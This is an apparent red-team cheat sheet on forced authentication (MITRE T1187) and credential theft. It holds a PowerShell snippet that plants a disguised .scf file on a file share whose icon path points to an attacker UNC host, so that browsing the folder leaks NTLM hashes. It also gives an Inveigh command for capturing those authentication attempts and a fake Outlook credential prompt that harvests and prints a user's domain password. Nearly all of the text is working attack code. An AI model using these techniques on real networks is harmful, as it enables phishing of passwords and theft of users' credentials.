# Creat scf File

MITRE ATT&CK Technique: [T1187](https://attack.mitre.org/wiki/Technique/T1187)

  $IPAddress = “192.168.1.1” # unc server
  $Location = “\\FILESERVER\FilesShare” # file server
  "[Shell]" > $Location\~T0P3492.jpg.scf
  "Command=2" >> $Location\~T0P3492.jpg.scf;
  "IconFile=\\$IPAddress\remote.ico" >> $Location\~T0P3492.jpg.scf
  "[Taskbar]" >> $Location\~T0P3492.jpg.scf
  "Command=ToggleDesktop" >> $Location\~T0P3492.jpg.scf

## Run Inveigh to Receive the Authentication Attempts

PS> Invoke-Inveigh -FileOutputDirectory C:\Temp\ -FileOutput Y -HTTP Y -NBNS Y -Tool 1

[Inveigh] (https://github.com/Kevin-Robertson/Inveigh)

## Credential Popper

    $ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your
    active directory logon details:","$env:userdomain\$env:username","");
    $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain;
    $pass = $ps.GetNetworkCredential().password;
    echo “`nDomain: $domain `nUsername: $user `nPassword: $pass `n”
